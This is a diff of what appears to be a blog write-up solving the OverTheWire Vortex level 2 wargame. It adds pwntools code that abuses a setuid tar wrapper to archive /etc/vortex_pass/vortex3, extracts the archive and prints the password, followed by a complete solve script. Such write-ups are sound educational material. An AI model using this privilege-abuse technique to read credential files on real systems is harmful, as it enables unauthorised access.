@@ -63,7 +63,7 @@ password_file = '/etc/vortex_pass/vortex3'
 <h2>Get shell PID</h2>
 <strong>NOTE:</strong>Did not need to actually get PID, through testing actually found out that <em>execv</em> does not evaluate $$ like bash does and just processes it as a normal character.  I have left this in to show flaw in thought process.
 
-Since it is hard coded that the name of the file will be <strong>/tmp/ownership.\$\$.tar</strong>; the <em>$$</em> in the file name is the decimal process ID of the invoked shell [^1]
+<strike>Since it is hard coded that the name of the file will be <strong>/tmp/ownership.\$\$.tar</strong>; the <em>$$</em> in the file name is the decimal process ID of the invoked shell</strike> [^1]
 
 {% highlight python %}
 shell_pid = s('echo $$')
@@ -72,5 +72,102 @@ shell_pid = s('echo $$')
 <h2>Run program</h2>
 The goal is to run this program that creates the tarball but make sure that when created it assigns the permissions of <em>vortex2</em> instead of the invoking permissions of <em>vortex3</em>.  To do this lets look at the [man page for tar](http://linuxcommand.org/man_pages/tar1.html).  Based on the options we should set the <strong>--mode</strong> with <em>'a+rw'</em>
 
+{% highlight python %}
+#run the program and ensure the file is written with vortex2 permissions, or atleast can be read
+arg1 = "-v"
+arg2 = "--mode='a+rw'"
+arg3 = password_file
+response = s('{0} {1} {2} {3}'.format(file_name, arg1, arg2, arg3))
+log.info(response)
+{% endhighlight %}
+
+<h2>Open tarball and get password</h2>
+
+1. Create a location to decompress the files
+2. Read the files
+
+{% highlight python %}
+#create a location where we can copy the file and work on it
+temp_location = "/tmp/happytimes_{0}".format(random.randint(1,10000))
+response = s('mkdir {0}'.format(temp_location))
+log.info(response)
+response = s("cp '/tmp/ownership.$$.tar' {0}/mine.tar".format(temp_location))
+log.info(response)
+
+#decompress the file and read the contents
+response = s("tar xvf {0}/mine.tar -C {0}".format(temp_location))
+log.info(response)
+password = s("cat {0}{1}".format(temp_location,password_file))
+log.success('PASSWORD: {0}'.format(password))
+{% endhighlight %}
+
+<h2>Clean up</h2>
+
+1. Remove files created
+2. Clean up environment
+
+{% highlight python %}
+#clean up after ourselves
+response = s('rm -rf %s' % temp_location)
+log.info(response)
+response = s("rm '/tmp/ownership.$$.tar'")
+log.info(response)
+
+#get rid of any junk from the buffer
+s.clean()
+{% endhighlight %}
+
 <h2>Endnotes</h2>
 [^1]: http://superuser.com/questions/247127/what-is-and-in-linux
+
+<h2>Complete Program</h2>
+{% highlight python %}
+from pwn import *
+
+HOST = 'vortex.labs.overthewire.org'
+USERNAME = 'vortex2'
+PASS = ''
+
+s = ssh(host=HOST, user=USERNAME, password=PASS)
+
+location = "/vortex"
+file_name = '%s/vortex2' % location
+password_file = '/etc/vortex_pass/vortex3' + chr(0)
+
+#(testing)download source file
+#s.download_file(file_name) #download the ELF
+
+#(testing) went down wrong road here thinking that C would actually evaluate $$ as the PID of process running
+#shell_pid = s('echo $$')
+#log.info('PID: %s' % shell_pid)
+
+#run the program and ensure the file is written with vortex2 permissions, or atleast can be read
+arg1 = "-v"
+arg2 = "--mode='a+rw'"
+arg3 = password_file
+response = s('{0} {1} {2} {3}'.format(file_name, arg1, arg2, arg3))
+log.info(response)
+
+#create a location where we can copy the file and work on it
+temp_location = "/tmp/happytimes_{0}".format(random.randint(1,10000))
+response = s('mkdir {0}'.format(temp_location))
+log.info(response)
+response = s("cp '/tmp/ownership.$$.tar' {0}/mine.tar".format(temp_location))
+log.info(response)
+
+#decompress the file and read the contents
+response = s("tar xvf {0}/mine.tar -C {0}".format(temp_location))
+log.info(response)
+password = s("cat {0}{1}".format(temp_location,password_file))
+log.success('PASSWORD: {0}'.format(password))
+
+#clean up after ourselves
+response = s('rm -rf %s' % temp_location)
+log.info(response)
+response = s("rm '/tmp/ownership.$$.tar'")
+log.info(response)
+
+#get rid of any junk from the buffer
+s.clean()
+
+{% endhighlight %}
